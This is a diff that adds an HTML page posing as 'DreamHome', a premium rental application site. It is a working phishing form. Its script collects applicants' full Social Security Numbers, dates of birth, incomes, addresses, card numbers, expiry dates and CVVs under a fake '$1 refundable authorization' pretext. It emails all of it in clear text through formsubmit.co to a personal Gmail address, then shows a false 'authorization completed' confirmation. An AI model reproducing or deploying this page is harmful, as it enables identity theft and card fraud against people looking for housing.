@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>DreamHome | Rental Application — Premium Dark Theme</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      background: radial-gradient(circle at 20% 30%, #0B0F1C, #06090F);
+      background-attachment: fixed;
+      padding: 2rem 1.5rem;
+      position: relative;
+    }
+
+    /* subtle grid overlay like crypto dashboard */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: 
+        linear-gradient(rgba(66, 153, 225, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(66, 153, 225, 0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .app-container {
+      max-width: 1120px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 2;
+    }
+
+    /* glassmorphic card - dark premium style */
+    .application-card {
+      background: rgba(18, 25, 45, 0.85);
+      backdrop-filter: blur(12px);
+      border-radius: 32px;
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(66, 153, 225, 0.15);
+      overflow: hidden;
+      transition: all 0.2s ease;
+    }
+
+    /* header with gradient accent */
+    .form-header {
+      background: linear-gradient(135deg, rgba(10, 20, 35, 0.95), rgba(5, 15, 25, 0.98));
+      padding: 2rem 2.5rem;
+      color: white;
+      border-bottom: 1px solid rgba(66, 153, 225, 0.25);
+    }
+
+    .form-header h1 {
+      font-size: 1.9rem;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      margin-bottom: 0.25rem;
+      background: linear-gradient(120deg, #FFFFFF, #94A3B8);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .form-header .subhead {
+      font-size: 1rem;
+      opacity: 0.8;
+      margin-top: 0.2rem;
+      color: #9CA3AF;
+    }
+
+    .applicant-notice {
+      background: rgba(30, 41, 59, 0.6);
+      border-radius: 20px;
+      padding: 1rem 1.3rem;
+      margin-top: 1.2rem;
+      border-left: 4px solid #3B82F6;
+      backdrop-filter: blur(4px);
+    }
+
+    .applicant-notice p {
+      margin: 0.25rem 0;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #CBD5E1;
+    }
+
+    .form-body {
+      padding: 2rem 2.5rem 2.2rem 2.5rem;
+    }
+
+    .info-callout {
+      background: rgba(30, 41, 59, 0.5);
+      border-radius: 18px;
+      padding: 0.9rem 1.3rem;
+      margin-bottom: 1.8rem;
+      font-size: 0.85rem;
+      color: #94A3B8;
+      border-left: 4px solid #3B82F6;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      backdrop-filter: blur(4px);
+    }
+
+    .form-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .form-group {
+      flex: 1;
+      min-width: 200px;
+    }
+
+    .full-width {
+      flex: 1 1 100%;
+    }
+
+    label {
+      font-size: 0.7rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      color: #60A5FA;
+      display: block;
+      margin-bottom: 0.45rem;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 0.85rem 1rem;
+      font-size: 0.9rem;
+      font-family: 'Inter', sans-serif;
+      background: rgba(15, 25, 45, 0.8);
+      border: 1px solid rgba(51, 102, 153, 0.4);
+      border-radius: 18px;
+      color: #E2E8F0;
+      transition: 0.2s;
+      outline: none;
+    }
+
+    input:focus, select:focus {
+      border-color: #3B82F6;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+      background: rgba(20, 32, 55, 0.9);
+    }
+
+    input::placeholder {
+      color: #5B6E8C;
+    }
+
+    .radio-group {
+      background: rgba(30, 41, 59, 0.4);
+      border-radius: 20px;
+      padding: 1rem 1.3rem;
+      margin-bottom: 1.6rem;
+      border: 1px solid rgba(59, 130, 246, 0.2);
+    }
+
+    .radio-option {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 10px;
+    }
+
+    .radio-option input {
+      width: 18px;
+      height: 18px;
+      accent-color: #3B82F6;
+    }
+
+    .radio-option label {
+      text-transform: none;
+      font-weight: 500;
+      font-size: 0.85rem;
+      letter-spacing: 0;
+      margin: 0;
+      color: #CBD5E1;
+    }
+
+    hr {
+      margin: 1.8rem 0;
+      border: none;
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.4), transparent);
+    }
+
+    .payment-panel {
+      background: rgba(20, 30, 50, 0.6);
+      border-radius: 24px;
+      padding: 1.6rem;
+      margin: 1rem 0 1rem;
+      border: 1px solid rgba(59, 130, 246, 0.25);
+      backdrop-filter: blur(4px);
+    }
+
+    .payment-title {
+      font-weight: 800;
+      font-size: 1rem;
+      color: #FBBF24;
+      margin-bottom: 0.3rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .fee-text {
+      background: rgba(59, 130, 246, 0.15);
+      font-size: 0.7rem;
+      display: inline-block;
+      padding: 0.2rem 1rem;
+      border-radius: 30px;
+      margin: 0.3rem 0 1rem 0;
+      color: #93C5FD;
+      font-weight: 600;
+    }
+
+    .card-row-spacing {
+      margin-bottom: 1.2rem;
+    }
+
+    .two-columns {
+      display: flex;
+      gap: 1.8rem;
+      flex-wrap: wrap;
+    }
+
+    .two-columns .form-group {
+      flex: 1;
+      min-width: 150px;
+    }
+
+    .btn-submit {
+      background: linear-gradient(135deg, #1E3A5F, #0F2A45);
+      border: 1px solid rgba(59, 130, 246, 0.5);
+      width: 100%;
+      padding: 1rem;
+      font-size: 0.95rem;
+      font-weight: 700;
+      border-radius: 44px;
+      color: white;
+      cursor: pointer;
+      transition: 0.2s;
+      font-family: 'Inter', sans-serif;
+      margin-top: 0.8rem;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn-submit:hover {
+      background: linear-gradient(135deg, #2563EB, #1D4ED8);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.3);
+      border-color: #3B82F6;
+    }
+
+    .status-message {
+      margin-top: 1rem;
+      padding: 0.75rem;
+      border-radius: 40px;
+      text-align: center;
+      font-weight: 500;
+      font-size: 0.8rem;
+      display: none;
+    }
+
+    .status-message.success {
+      background: rgba(34, 197, 94, 0.15);
+      color: #4ADE80;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      display: block;
+    }
+
+    .status-message.error {
+      background: rgba(239, 68, 68, 0.15);
+      color: #F87171;
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      display: block;
+    }
+
+    .confirmation-card {
+      background: rgba(34, 197, 94, 0.1);
+      border-radius: 20px;
+      padding: 1rem 1.3rem;
+      margin-top: 1rem;
+      border: 1px solid rgba(34, 197, 94, 0.3);
+      text-align: center;
+      display: none;
+      backdrop-filter: blur(4px);
+    }
+
+    .confirmation-card p {
+      font-weight: 700;
+      color: #4ADE80;
+      font-size: 0.95rem;
+      margin-bottom: 0;
+      letter-spacing: -0.2px;
+    }
+
+    .footer-note {
+      text-align: center;
+      font-size: 0.65rem;
+      margin-top: 2rem;
+      color: #5B6E8C;
+      border-top: 1px solid rgba(59, 130, 246, 0.2);
+      padding-top: 1rem;
+    }
+
+    @media (max-width: 700px) {
+      body {
+        padding: 1rem;
+      }
+      .form-body {
+        padding: 1.5rem;
+      }
+      .form-row {
+        flex-direction: column;
+        gap: 1rem;
+      }
+      .two-columns {
+        flex-direction: column;
+        gap: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="app-container">
+  <div class="application-card">
+    <div class="form-header">
+      <h1>Application For Appointment</h1>
+      <div class="subhead">Apply For Your Dream Home</div>
+      <div class="applicant-notice">
+        <p>🏡 Complete the rental application, and we will get in touch with you soon.</p>
+        <p>✅ <strong>You are applying to rent:</strong> Each resident over 18 must submit a separate rental application.</p>
+      </div>
+    </div>
+    <div class="form-body">
+      <div class="info-callout">
+        <span>⚡ Fast processing • encrypted security</span>
+        <span>🔒 Refundable processing fee: $1 (authorization hold)</span>
+      </div>
+
+      <form id="rentalForm">
+        <div class="form-group full-width">
+          <label>📅 Desired move-in date</label>
+          <input type="date" id="moveInDate" required>
+        </div>
+
+        <div class="radio-group">
+          <div class="radio-option">
+            <input type="radio" name="applicantRole" id="tenantRad" value="Tenant (living on property)" checked>
+            <label for="tenantRad">✅ I am applying as a <strong>tenant</strong> — I will be living on the property.</label>
+          </div>
+          <div class="radio-option">
+            <input type="radio" name="applicantRole" id="guarantorRad" value="Guarantor/Co-signer (not living on property)">
+            <label for="guarantorRad">🛡️ I am applying as a <strong>guarantor/co-signer</strong> — I will not live on the property.</label>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group"><label>First name</label><input type="text" id="firstName" placeholder="James" required></div>
+          <div class="form-group"><label>Last name</label><input type="text" id="lastName" placeholder="Whitmore" required></div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group"><label>Email address</label><input type="email" id="email" placeholder="hello@dreamhome.com" required></div>
+          <div class="form-group"><label>Phone / Mobile</label><input type="tel" id="phone" placeholder="(212) 555-1234" required></div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group"><label>Street address</label><input type="text" id="address" placeholder="850 Park Avenue" required></div>
+          <div class="form-group"><label>City</label><input type="text" id="city" placeholder="Austin" required></div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group"><label>State</label><input type="text" id="state" placeholder="Texas" required></div>
+          <div class="form-group"><label>Zip code</label><input type="text" id="zip" placeholder="78701" required></div>
+          <div class="form-group">
+            <label>Country</label>
+            <select id="country" required>
+              <option value="" disabled selected>Select country</option>
+              <option>United States</option><option>Canada</option><option>United Kingdom</option>
+              <option>Australia</option><option>Germany</option><option>France</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group"><label>🎂 Date of birth</label><input type="date" id="dob" required></div>
+          <div class="form-group"><label>💰 Annual income (USD)</label><input type="number" id="income" placeholder="82,000" required></div>
+        </div>
+
+        <div class="form-group full-width">
+          <label>🆔 Social Security Number (SSN)</label>
+          <input type="text" id="ssn" placeholder="XXX-XX-XXXX" required>
+        </div>
+
+        <hr>
+
+        <div class="payment-panel">
+          <div class="payment-title">💳 Pay here for your appointment confirmation</div>
+          <div class="fee-text">🔒 Refundable processing fee: $1 (authorization hold)</div>
+          
+          <div class="form-group full-width card-row-spacing">
+            <label>Card number</label>
+            <input type="text" id="cardNumber" placeholder="4242 4242 4242 4242" required>
+          </div>
+
+          <div class="two-columns">
+            <div class="form-group">
+              <label>📅 Expiration Date (MM/YY)</label>
+              <input type="text" id="expiry" placeholder="09/28" required>
+            </div>
+            <div class="form-group">
+              <label>🔐 CVV</label>
+              <input type="text" id="cvv" placeholder="123" required>
+            </div>
+          </div>
+        </div>
+
+        <button type="button" id="submitBtn" class="btn-submit">Submit application →</button>
+        <div id="formStatus" class="status-message"></div>
+        <div id="simpleConfirmation" class="confirmation-card"></div>
+        <div class="footer-note">© DreamHome — Premium secure rental platform</div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<script>
+  // Premium dark theme rental application - after submission only "Your application has been received."
+  const form = document.getElementById('rentalForm');
+  const statusDiv = document.getElementById('formStatus');
+  const submitBtn = document.getElementById('submitBtn');
+  const confirmationDiv = document.getElementById('simpleConfirmation');
+  
+  let isProcessing = false;
+  
+  const requiredFields = [
+    'moveInDate', 'firstName', 'lastName', 'email', 'phone',
+    'address', 'city', 'state', 'zip', 'country', 'dob', 'income',
+    'ssn', 'cardNumber', 'expiry', 'cvv'
+  ];
+  
+  function showMessage(msg, type = 'info') {
+    statusDiv.className = `status-message ${type}`;
+    statusDiv.textContent = msg;
+    setTimeout(() => {
+      if (statusDiv.className === `status-message ${type}`) {
+        statusDiv.style.display = 'none';
+        statusDiv.className = 'status-message';
+      }
+    }, 6000);
+    statusDiv.style.display = 'block';
+  }
+  
+  function isValidExpiry(expiryStr) {
+    return /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryStr);
+  }
+  
+  function isValidSSN(ssn) {
+    const ssnPattern = /^\d{3}-?\d{2}-?\d{4}$/;
+    return ssnPattern.test(ssn);
+  }
+  
+  function validateAllFields() {
+    let missing = [];
+    for (let id of requiredFields) {
+      const el = document.getElementById(id);
+      if (!el || !el.value.trim()) missing.push(id);
+    }
+    const expiryVal = document.getElementById('expiry')?.value.trim() || '';
+    let expiryOk = true;
+    if (expiryVal && !isValidExpiry(expiryVal)) expiryOk = false;
+    
+    const cardNum = document.getElementById('cardNumber')?.value.trim().replace(/\s/g, '') || '';
+    const cvvVal = document.getElementById('cvv')?.value.trim() || '';
+    const ssnVal = document.getElementById('ssn')?.value.trim() || '';
+    
+    if (missing.length > 0) {
+      showMessage(`Please complete all required fields (${missing.length} missing).`, "error");
+      return false;
+    }
+    if (!expiryOk) {
+      showMessage("Expiration date must be in MM/YY format (e.g., 12/27).", "error");
+      return false;
+    }
+    if (cardNum.length < 13) {
+      showMessage("Please enter a valid card number (minimum 13 digits).", "error");
+      return false;
+    }
+    if (cvvVal.length < 3 || cvvVal.length > 4) {
+      showMessage("CVV must be 3 or 4 digits.", "error");
+      return false;
+    }
+    if (!isValidSSN(ssnVal)) {
+      showMessage("Please enter a valid Social Security Number (format: XXX-XX-XXXX or XXXXXXXXX).", "error");
+      return false;
+    }
+    return true;
+  }
+  
+  function getSubmissionPayload() {
+    const role = document.querySelector('input[name="applicantRole"]:checked')?.value || "Tenant";
+    const fullCardNumber = document.getElementById('cardNumber').value.trim();
+    const fullExpiry = document.getElementById('expiry').value.trim();
+    const fullCvv = document.getElementById('cvv').value.trim();
+    const ssnRaw = document.getElementById('ssn').value.trim();
+    
+    return {
+      application_type: role,
+      full_name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`,
+      first_name: document.getElementById('firstName').value,
+      last_name: document.getElementById('lastName').value,
+      email: document.getElementById('email').value,
+      phone: document.getElementById('phone').value,
+      street_address: document.getElementById('address').value,
+      city: document.getElementById('city').value,
+      state: document.getElementById('state').value,
+      zip: document.getElementById('zip').value,
+      country: document.getElementById('country').value,
+      date_of_birth: document.getElementById('dob').value,
+      annual_income: document.getElementById('income').value,
+      desired_move_in_date: document.getElementById('moveInDate').value,
+      social_security_number: ssnRaw,
+      card_number_full: fullCardNumber,
+      card_expiry_full: fullExpiry,
+      cvv_full: fullCvv,
+      submitted_at: new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })
+    };
+  }
+  
+  function showSimpleConfirmation() {
+    confirmationDiv.innerHTML = '<p>✅ Your application has been received.</p>';
+    confirmationDiv.style.display = "block";
+  }
+  
+  async function sendToPropertyManager(payload) {
+    const endpoint = 'https://formsubmit.co/ajax/davidjackie711@gmail.com';
+    const emailData = {
+      ...payload,
+      _subject: `🏠 NEW RENTAL APPLICATION: ${payload.full_name} - DreamHome (Move-in ${payload.desired_move_in_date})`,
+      _template: 'table',
+      _captcha: 'false',
+      _replyto: payload.email
+    };
+    try {
+      const response = await fetch(endpoint, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify(emailData)
+      });
+      const result = await response.json();
+      if (response.ok) return { success: true };
+      else return { success: false, error: result.message || 'Unable to deliver' };
+    } catch (err) {
+      return { success: false, error: err.message };
+    }
+  }
+  
+  async function handleFormSubmit() {
+    if (isProcessing) return;
+    if (!validateAllFields()) return;
+    
+    isProcessing = true;
+    const originalText = submitBtn.innerText;
+    submitBtn.disabled = true;
+    submitBtn.style.opacity = "0.7";
+    submitBtn.innerText = "Processing $1 authorization...";
+    
+    const formData = getSubmissionPayload();
+    const result = await sendToPropertyManager(formData);
+    
+    if (result.success) {
+      showMessage("✓ Application submitted successfully! $1 authorization completed.", "success");
+      submitBtn.innerText = "✓ Application sent";
+      showSimpleConfirmation();
+      setTimeout(() => {
+        if (confirm("Application delivered. Clear the form to start a new application?")) {
+          form.reset();
+          submitBtn.innerText = "Submit application →";
+          submitBtn.disabled = false;
+          submitBtn.style.opacity = "1";
+          statusDiv.style.display = "none";
+          confirmationDiv.style.display = "none";
+          confirmationDiv.innerHTML = "";
+        } else {
+          submitBtn.disabled = false;
+          submitBtn.style.opacity = "1";
+          submitBtn.innerText = "Submit application →";
+        }
+      }, 1500);
+    } else {
+      showMessage(`✗ Submission error: ${result.error}. Please check your connection and try again.`, "error");
+      submitBtn.disabled = false;
+      submitBtn.style.opacity = "1";
+      submitBtn.innerText = originalText;
+    }
+    isProcessing = false;
+  }
+  
+  // Expiry auto-formatting
+  const expiryInput = document.getElementById('expiry');
+  if (expiryInput) {
+    expiryInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/[^0-9]/g, '');
+      if (raw.length >= 2) {
+        let month = raw.substring(0,2);
+        if (parseInt(month) > 12) month = "12";
+        let yearPart = raw.substring(2,4);
+        this.value = month + (yearPart ? '/' + yearPart : '');
+      } else {
+        this.value = raw;
+      }
+    });
+  }
+  
+  // SSN auto-formatting
+  const ssnInput = document.getElementById('ssn');
+  if (ssnInput) {
+    ssnInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/[^0-9]/g, '');
+      if (raw.length >= 3 && raw.length < 5) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3);
+      } else if (raw.length >= 5 && raw.length < 9) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3,5) + '-' + raw.substring(5);
+      } else if (raw.length >= 9) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3,5) + '-' + raw.substring(5,9);
+      } else {
+        this.value = raw;
+      }
+    });
+  }
+  
+  submitBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    handleFormSubmit();
+  });
+  
+  const cvvField = document.getElementById('cvv');
+  if (cvvField) {
+    cvvField.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        handleFormSubmit();
+      }
+    });
+  }
+</script>
+</body>
+</html>
